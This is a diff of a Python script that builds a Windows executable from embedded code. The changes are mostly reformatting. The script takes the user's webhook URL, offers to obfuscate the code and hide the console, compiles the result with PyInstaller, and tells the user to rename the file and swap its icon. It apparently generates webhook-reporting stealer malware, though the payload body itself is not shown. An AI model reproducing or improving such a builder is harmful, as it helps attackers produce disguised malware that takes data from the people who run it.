@@ -5,13 +5,21 @@ import marshal
 import traceback
 import subprocess
 
-if "Python was not found; run without arguments to install from the Microsoft Store, or disable this shortcut from Settings > Manage App Execution Aliases." in subprocess.check_output("python --version").decode():
-    os.system("powershell Remove-Item $env:LOCALAPPDATA\Microsoft\WindowsApps\python.exe") # Remove the bugged app alias that Microsoft added (Because Microsoft doesn't do anything right)
+if (
+    "Python was not found; run without arguments to install from the Microsoft Store, or disable this shortcut from Settings > Manage App Execution Aliases."
+    in subprocess.check_output("python --version").decode()
+):
+    os.system(
+        "powershell Remove-Item $env:LOCALAPPDATA\Microsoft\WindowsApps\python.exe"
+    )  # Remove the bugged app alias that Microsoft added (Because Microsoft doesn't do anything right)
     os.system("cls")
 
 if "is not recognized" in subprocess.check_output("python --version").decode():
-    print("Python is not added to PATH! Reinstall Python and make sure to tick the Add Python to PATH box!")
-    while True: pass
+    print(
+        "Python is not added to PATH! Reinstall Python and make sure to tick the Add Python to PATH box!"
+    )
+    while True:
+        pass
 
 os.system("python -m pip install pyinstaller pypiwin32 pycryptodome requests")
 os.system("cls")
@@ -24,7 +32,7 @@ webhook = input("Paste your Webhook: ")
 obfuscate = input("Obfuscate (Encrypt) the code? (Y/N): ")
 console = input("Show the Console when running? (Y/N): ")
 
-id = base64.b64encode(os.urandom(16)).decode().replace("=","").replace("/","")
+id = base64.b64encode(os.urandom(16)).decode().replace("=", "").replace("/", "")
 
 code = f"""
 webhook = "{webhook}" # WEBHOOK HERE
@@ -200,20 +208,34 @@ try:
     else:
         newcode = code
 
-    open(f"tmp_{id}.py", "w").write(newcode)
+    os.mkdir("out")
 
-    os.system(f"pyinstaller --clean {'--noconsole ' if console.lower().startswith('Y') else ''}--onefile tmp_{id}.py")
+    open(f"out\\tmp_{id}.py", "w").write(newcode)
+
+    os.system(
+        f"python -m PyInstaller --clean {'--noconsole ' if console.lower().startswith('Y') else ''}--onefile out\\tmp_{id}.py"
+    )
+
+    os.remove(f"tmp_{id}.spec")
 
     shutil.copy2(f"dist\\tmp_{id}.exe", "output.exe")
+
     shutil.rmtree("dist")
     shutil.rmtree("build")
-    os.remove(f"tmp_{id}.py")
-    os.remove(f"tmp_{id}.spec")
+
+    shutil.rmtree("out")
 
     os.system("cls")
 
-    print("Done!\nYou can rename to file\nTo change the icon, download a .ico file as well as Resource Hacker. Then replace the resource. You can find a tutorial on how to do this on YouTube.")
-    while True: pass
+    print(
+        "Done!\nYou can rename to file\nTo change the icon, download a .ico file as well as Resource Hacker. Then replace the resource. You can find a tutorial on how to do this on YouTube."
+    )
+    while True:
+        pass
 except Exception:
-    print(traceback.format_exc() + "\n\nAn Error occured! See above, and make an issue on the GitHub repository or contact me if you can't solve it yourself!")
-    while True: pass
+    print(
+        traceback.format_exc()
+        + "\n\nAn Error occured! See above, and make an issue on the GitHub repository or contact me if you can't solve it yourself!"
+    )
+    while True:
+        pass
